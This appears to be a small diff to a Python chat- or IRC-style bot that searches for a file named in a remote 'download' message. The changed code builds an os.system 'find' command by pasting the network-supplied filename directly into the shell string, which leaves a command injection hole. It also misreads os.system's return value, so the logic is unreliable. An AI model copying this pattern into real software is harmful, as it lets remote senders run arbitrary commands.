@@ -47,7 +47,7 @@ while True:
 					ws.send(b'NOTICE BATDOT'+str.encode(row[0])+b',')
 
 		if b'download' in msg:
-			file = (((msg.decode('utf-8')).split("download"))[1].split('\''))[1]
+			file = (((msg.decode('utf-8')).split("download"))[1].split('\''))[0]
 			directory = ''.join([i for i in str(os.system('find . -name' + '\'' + file + '\'')).split('0')[0]][2:])
 			ws.send(b'NOTICE BATDOT  Directory \''+str.encode(directory)+b'\'')
 	except socket.timeout:
